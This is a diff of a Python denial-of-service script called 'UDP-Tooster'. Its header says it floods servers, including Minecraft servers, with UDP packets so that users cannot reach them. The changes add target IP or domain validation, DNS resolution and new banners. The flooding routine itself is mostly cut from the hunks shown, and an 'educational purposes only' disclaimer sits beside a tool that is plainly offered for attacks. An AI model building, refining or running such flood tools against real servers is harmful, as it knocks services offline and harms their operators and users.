@@ -1,20 +1,29 @@
-#author:
-#█ ▄▀█ █▀▄▀█ ▀█▀ █▀█ █▀█ █▀ ▀█▀
-#█ █▀█ █░▀░█ ░█░ █▄█ ▀▀█ ▄█ ░█░
-#name:
-# █ █ █▀▄ █▀▄    █▄▀ █▄█    ▀█▀ ██▀ ▄▀▄ █▄ ▄█
-# ▀▄█ █▄▀ █▀  ▀▀ █ █ █ █ ▀▀  █  █▄▄ █▀█ █ ▀ █
-#description:
-# A node program that send many packets to a Minecraft server to cause lag and internet traffic 
+# author:
+# █ ▄▀█ █▀▄▀█ ▀█▀ █▀█ █▀█ █▀ ▀█▀
+# █ █▀█ █░▀░█ ░█░ █▄█ ▀▀█ ▄█ ░█░
+# name:
+# UDP-▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█
+#    ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄
+# description:
+# A tool lets you send udp flood on servers with internet traffic to prevent users from accessing connected online services or minecraft servers.
+# warning: 
+# This is strongly for educational purposes only and for testing your ddos protection, I am not responsible for any damages you have or may cause.
 
 import os
 import random
 import sys
 import socket
 import threading
+import ipaddress
 
-# Clear the terminal
 os.system('clear' if os.name == 'posix' else 'cls')
+
+def is_valid_ipv4(ip):
+    try:
+        ipaddress.IPv4Address(ip)
+        return True
+    except ipaddress.AddressValueError:
+        return False
 
 def run(ip_run, port_run, times_run, threads_run):
     data_run = random._urandom(1024)
@@ -38,29 +47,39 @@ def run(ip_run, port_run, times_run, threads_run):
 
 def main():
     print("")
-    print("\033[1;31m█ █ █▀▄ █▀▄    █▄▀ █▄█    ▀█▀ ██▀ ▄▀▄ █▄ ▄█\033[0m")
-    print("\033[1;31m▀▄█ █▄▀ █▀  ▀▀ █ █ █ █ ▀▀  █  █▄▄ █▀█ █ ▀ █\033[0m")
+    print("\033[1;31m█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█\033[0m")
+    print("\033[1;31m█▄█░█▄█░█▀▀░ ▀▀▀ ░█░ █▄█ ▀▀█ ▄█ ░█░ ██▄ █▀▄\033[0m")
     print("")
     print("\033[1;31m[Warning]\033[1;37m This tool is for educational purposes \nonly, I am not responsible for any damages you \nhave caused or may cause, use it at your own risk!")
     print("")
     
     while True:
         try:
-            ip = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target IP:\033[0m ")
-            if ip.strip():
+            target = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target IP or domain:\033[0m ")
+            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                 break
             else:
-                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP.\033[0m")
+                print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid target IP or domain.\033[0m")
         except KeyboardInterrupt:
             print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
             sys.exit(0)
+            
+    if not is_valid_ipv4(target):
+        try:
+            ip = socket.gethostbyname(target)
+            print(f"\033[1;31m[+]\033[0m Resolved \033[1;38;2;255;100;100m{target}\033[1;37m to \033[1;38;2;255;100;100m{ip}\033[1;37m")
+        except socket.error as e:
+            print("\033[1;31m[!]\033[0m \033[1;37mError resolving the target: {}\033[0m".format(e))
+            sys.exit(1)
+    else:
+        ip = target
 
     while True:
         try:
             port = int(input("\033[1;31m[#]\033[0m ""\033[1;37mEnter target port: \033[0m "))
-            break  # Exit the loop if conversion to int is successful
+            break
         except ValueError:
-            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid number for the port.\033[0m")
+            print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the port.\033[0m")
         except KeyboardInterrupt:
             print("\n\033[1;31m[!]\033[0m \033[1;37mScript terminated by user (Ctrl+C). Exiting.\033[0m")
             sys.exit(0)
@@ -68,9 +87,11 @@ def main():
     while True:
         try:
             times_input = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter packets per connection: \033[0m ")
-            if times_input.strip():  # Check if the input is not empty
+            if times_input.strip():  
+                
                 times = int(times_input)
-                break  # Exit the loop if conversion to int is successful
+                break
+            
             else:
                 print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the packets.\033[0m")
         except ValueError:
@@ -82,9 +103,10 @@ def main():
     while True:
         try:
             threads_input = input("\033[1;31m[#]\033[0m ""\033[1;37mEnter number of threads: \033[0m ")
-            if threads_input.strip():  # Check if the input is not empty
+            if threads_input.strip():
+                
                 threads = int(threads_input)
-                break  # Exit the loop if conversion to int is successful
+                break
             else:
                 print("\033[1;31m[!]\033[0m \033[1;37mInvalid input. Please enter a valid integer for the threads.\033[0m")
         except ValueError:
